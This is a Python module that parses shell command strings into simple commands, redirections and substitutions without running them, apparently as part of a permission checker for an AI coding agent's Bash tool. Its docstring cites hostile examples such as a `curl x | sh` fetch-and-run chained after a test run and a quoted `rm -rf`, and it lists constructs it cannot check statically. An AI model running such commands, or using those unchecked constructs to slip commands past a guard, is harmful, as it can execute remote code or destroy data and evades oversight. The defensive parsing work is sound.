"""Shell commands, split into the simple commands they run (Phase 2, milestone 2).

Claude Code's Bash tool runs a string through a shell, so a rule can't judge the string as a
whole: `pytest && curl x | sh` starts like a test run. This module splits a command the way a
shell would, without running anything:

- `;`, `&`, `&&`, `||`, newlines and `( )` end a command; `|` and `|&` pipe one into the next.
- Quotes and backslashes are removed, so `'rm' -rf` is `rm -rf`.
- Redirections are collected: what each command writes (`>`, `>>`, `&>`) and reads (`<`), and
  whether its input is a pipe, a heredoc or a here-string. Heredoc bodies are data, not commands.
- `$(...)` and backticks are parsed too: their commands run, so they're judged. Their output
  becomes an argument nobody can read in advance.

What can't be read statically is reported in `unchecked` (tier 3, by the spec): a command named by
a variable or a substitution, function definitions, `eval`, process substitution, unterminated
quotes, and anything nested too deeply.
"""

from __future__ import annotations

import re
from typing import NamedTuple

SEPARATORS = {";", "&", "&&", "||", "\n", ";;", "(", ")"}
PIPES = {"|", "|&"}
WRITES = {">", ">>", "&>", "&>>", ">|", "<>"}
DUPLICATES = {">&", "<&"}
READS = {"<"}
OPERATORS = sorted(
    SEPARATORS | PIPES | WRITES | DUPLICATES | READS | {"<<", "<<-", "<<<"},
    key=len,
    reverse=True,
)
RESERVED = {"if", "then", "else", "elif", "fi", "do", "done", "while", "until", "for", "in",
            "case", "esac", "select", "time", "!", "{", "}", "[[", "]]", "coproc"}  # fmt: skip
ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*\+?=")
UNSEEN = "\0"  # stands in for text produced at run time, such as $(...) output
MAX_DEPTH = 4


class Word(NamedTuple):
    text: str  # quotes removed; UNSEEN where a substitution's output goes
    variable: bool  # contains an unquoted or double-quoted $NAME
    substituted: bool  # contains $(...) or backticks


class Token(NamedTuple):
    op: str | None  # an operator, or None for a word
    word: Word | None


class Simple(NamedTuple):
    words: tuple[str, ...]  # the program and its arguments, assignments dropped
    writes: tuple[str, ...]  # files written by redirection
    reads: tuple[str, ...]  # files read by redirection
    stdin: str | None  # "pipe", "heredoc" or "here-string"
    named_at_run_time: bool  # the program's name comes from a variable or substitution


class Script(NamedTuple):
    commands: tuple[Simple, ...]  # every simple command, substitutions' included
    pipelines: tuple[tuple[Simple, ...], ...]
    unchecked: tuple[str, ...]  # why some of it can't be read statically


class _Lexer:
    def __init__(self, text: str, depth: int) -> None:
        self.s = text
        self.i = 0
        self.depth = depth
        self.unchecked: list[str] = []
        self.nested: list[Script] = []  # the commands inside $(...) and backticks
        self.heredocs: list[tuple[str, bool]] = []

    def tokens(self, until_paren: bool = False) -> list[Token]:
        """Tokens up to the end, or with `until_paren`, up to an unmatched `)`."""
        out: list[Token] = []
        parens = 0
        while self.i < len(self.s):
            c = self.s[self.i]
            if c in " \t\r":
                self.i += 1
            elif c == "\\" and self.s.startswith("\n", self.i + 1):
                self.i += 2  # a line continuation
            elif c == "#":
                while self.i < len(self.s) and self.s[self.i] != "\n":
                    self.i += 1
            elif c == "\n":
                self.i += 1
                out.append(Token("\n", None))
                self._skip_heredoc_bodies()
            elif (op := self._operator()) is not None:
                if op in ("<", ">") and self.s.startswith("(", self.i + 1):
                    self.unchecked.append("process substitution")
                if op == "(":
                    parens += 1
                elif op == ")":
                    if until_paren and parens == 0:
                        self.i += 1
                        return out
                    parens -= 1
                self.i += len(op)
                out.append(Token(op, None))
                if op in ("<<", "<<-"):
                    while self.s.startswith((" ", "\t"), self.i):
                        self.i += 1
                    delimiter = self._word() or Word("", False, False)
                    out.append(Token(None, delimiter))
                    self.heredocs.append((delimiter.text, op == "<<-"))
            elif (word := self._word()) is not None:
                out.append(Token(None, word))
        if until_paren:
            self.unchecked.append("an unterminated substitution")
        return out

    def _operator(self) -> str | None:
        for op in OPERATORS:
            if self.s.startswith(op, self.i):
                return op
        return None

    def _skip_heredoc_bodies(self) -> None:
        for delimiter, strip_tabs in self.heredocs:
            while self.i < len(self.s):
                end = self.s.find("\n", self.i)
                line = self.s[self.i : end if end >= 0 else len(self.s)]
                self.i = end + 1 if end >= 0 else len(self.s)
                if (line.lstrip("\t") if strip_tabs else line) == delimiter:
                    break
        self.heredocs.clear()

    def _word(self) -> Word | None:
        """The next word, or None for a file descriptor's number, as in `2>`."""
        text: list[str] = []
        variable = substituted = False
        while self.i < len(self.s):
            c = self.s[self.i]
            if c in " \t\r\n":
                break
            if self._operator() is not None:
                if c in "<>" and text and "".join(text).isdigit():
                    return None
                break
            if c == "'":
                end = self.s.find("'", self.i + 1)
                if end < 0:
                    self.unchecked.append("an unterminated quote")
                    end = len(self.s)
                text.append(self.s[self.i + 1 : end])
                self.i = end + 1
            elif c == '"':
                self.i += 1
                while self.i < len(self.s) and self.s[self.i] != '"':
                    d = self.s[self.i]
                    if d == "\\" and self.i + 1 < len(self.s) and self.s[self.i + 1] in '"\\$`':
                        text.append(self.s[self.i + 1])
                        self.i += 2
                    elif d in "$`":
                        v, sub = self._dollar_or_backtick(text)
                        variable, substituted = variable or v, substituted or sub
                    else:
                        text.append(d)
                        self.i += 1
                if self.i >= len(self.s):
                    self.unchecked.append("an unterminated quote")
                self.i += 1
            elif c == "\\":
                if self.s.startswith("\n", self.i + 1):
                    self.i += 2  # a line continuation inside a word: `gi\⏎t` is `git`
                    continue
                text.append(self.s[self.i + 1 : self.i + 2])
                self.i += 2
            elif c in "$`":
                v, sub = self._dollar_or_backtick(text)
                variable, substituted = variable or v, substituted or sub
            else:
                text.append(c)
                self.i += 1
        return Word("".join(text), variable, substituted)

    def _dollar_or_backtick(self, text: list[str]) -> tuple[bool, bool]:
        """Read `$(...)`, backticks or a variable; returns (variable, substituted)."""
        if self.s.startswith("$(", self.i) or self.s[self.i] == "`":
            if self.s[self.i] == "`":
                end = self.s.find("`", self.i + 1)
                inner = self.s[self.i + 1 : end if end >= 0 else len(self.s)]
                self.i = end + 1 if end >= 0 else len(self.s)
                self.nested.append(parse(inner, self.depth + 1))
            else:
                self.i += 2
                if self.depth + 1 > MAX_DEPTH:
                    self.unchecked.append("substitutions nested too deeply")
                lexer = _Lexer(self.s, self.depth + 1)
                lexer.i = self.i
                tokens = lexer.tokens(until_paren=True)
                self.i = lexer.i
                self.nested.append(_assemble(tokens, lexer))
            text.append(UNSEEN)
            return False, True
        name = re.match(r"\$(\{[^}]*\}?|[A-Za-z_][A-Za-z0-9_]*|[0-9?@*#$!-])", self.s[self.i :])
        if name:
            text.append(UNSEEN)
            self.i += len(name.group(0))
            return True, False
        text.append("$")
        self.i += 1
        return False, False


def parse(command: str, depth: int = 0) -> Script:
    """Split `command` into the simple commands it would run."""
    if depth > MAX_DEPTH:
        return Script((), (), ("commands nested too deeply",))
    lexer = _Lexer(command, depth)
    tokens = lexer.tokens()
    return _assemble(tokens, lexer)


def _assemble(tokens: list[Token], lexer: _Lexer) -> Script:
    pipelines: list[tuple[Simple, ...]] = []
    unchecked = list(lexer.unchecked)
    pipeline: list[Simple] = []
    words: list[Word] = []
    writes: list[str] = []
    reads: list[str] = []
    stdin: str | None = None

    def finish_command(next_stdin: str | None) -> None:
        nonlocal words, writes, reads, stdin
        if words or writes or reads:
            program_dynamic = bool(words) and (words[0].variable or words[0].substituted)
            names = tuple(w.text for w in words)
            pipeline.append(Simple(names, tuple(writes), tuple(reads), stdin, program_dynamic))
            if program_dynamic:
                unchecked.append("a command named at run time")
            if words and words[0].text == "eval":
                unchecked.append("eval")
        words, writes, reads, stdin = [], [], [], next_stdin

    def finish_pipeline() -> None:
        finish_command(None)
        if pipeline:
            pipelines.append(tuple(pipeline))
            pipeline.clear()

    i = 0
    while i < len(tokens):
        op, word = tokens[i]
        if op in PIPES:
            finish_command("pipe")
        elif op == "(" and len(words) == 1 and i + 1 < len(tokens) and tokens[i + 1].op == ")":
            unchecked.append("a function definition")
            i += 1
        elif op in SEPARATORS:
            finish_pipeline()
        elif op is not None:
            target = tokens[i + 1].word if i + 1 < len(tokens) else None
            if target is not None:
                i += 1
            name = target.text if target else ""
            if op in WRITES or (op == ">&" and not re.fullmatch(r"[0-9]+|-", name)):
                writes.append(name)
            elif op in READS:
                reads.append(name)
            elif op in ("<<", "<<-"):
                stdin = "heredoc"
            elif op == "<<<":
                stdin = "here-string"
        elif word is not None:
            if not words and word.text in RESERVED:
                pass  # a keyword like `if` or `do`: what follows is the command
            elif not words and ASSIGNMENT.match(word.text):
                pass  # `X=1 cmd` sets a variable for cmd
            elif not words and word.text == "function":
                unchecked.append("a function definition")
            else:
                words.append(word)
        i += 1
    finish_pipeline()

    commands = [c for p in pipelines for c in p]
    for nested in lexer.nested:
        commands += nested.commands
        pipelines += nested.pipelines
        unchecked += nested.unchecked
    return Script(tuple(commands), tuple(pipelines), tuple(dict.fromkeys(unchecked)))
